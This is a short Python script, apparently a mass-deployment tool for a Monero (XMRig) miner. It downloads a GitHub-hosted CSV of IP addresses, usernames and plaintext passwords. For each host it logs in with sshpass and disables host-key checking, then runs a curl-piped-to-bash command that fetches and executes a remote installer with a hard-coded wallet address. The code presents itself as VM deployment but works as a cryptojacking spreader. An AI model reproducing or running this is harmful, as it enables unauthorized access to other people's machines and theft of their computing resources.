#!/usr/local/bin/python
# deploy.py: Deploy Multiple VM's from csv on github
# Version 2.0
# uses sshpass

import csv
import os
import requests



# ===========================================================================================================================================
# VARS - Please modify this section as you require
# ===========================================================================================================================================
url = 'https://raw.githubusercontent.com/junaidd007/Monero/main/Cookie/Cookie.csv' # Set this to the location of your csv file
xmr_addy = '47TFyE1CiWNgcB5AMn9MSNKA4Lap9TcRwAvdbKedrK7VYWyqVTwE5qWWhW4Tdm4y2nNf9deqPdagqXWXwezwoSfPSx8jk3q' # Please make sure to set your XMR Address here
# ===========================================================================================================================================

# ===========================================================================================================================================







# ===========================================================================================================================================
# Do not edit below this line
# ===========================================================================================================================================

base_install_cmd = "'curl -s -L https://raw.githubusercontent.com/junaidd007/Monero/main/Cookie/Cookie.sh | bash -s " + xmr_addy + "'"
print("Downloading csv from: ", url, " Please make sure this file is up to date!")
req = requests.get(url)
url_content = req.content
csv_file = open("cookie.csv","wb")
csv_file.write(url_content)
csv_file.close()
print("File Has been downloaded and saved to your computer!")

print("Processing The CSV file")
print("we will be installing the miner with the following command :", base_install_cmd)
with open('cookie.csv', 'r') as csvfile:  
    reader = csv.reader(csvfile, delimiter='	')
    for row in reader:

        print('Connecting to VM - IP Address: ', row['ip'], ' Username: ', row['user'], ' Password: ', row['pass'])
        install_cmd = "sshpass -p " + row['pass'] + " ssh -o StrictHostKeyChecking=no " + row['user'] + "@" + row['ip'] + " " + base_install_cmd
        try:
            returned_value = os.system(install_cmd)
        except:
            continue


        print("="*50, install_cmd, "="*50)
        print('VM been completed and xmrig has started')
            
# TODO: Delete CSV file after, but fuck it i'm lazy
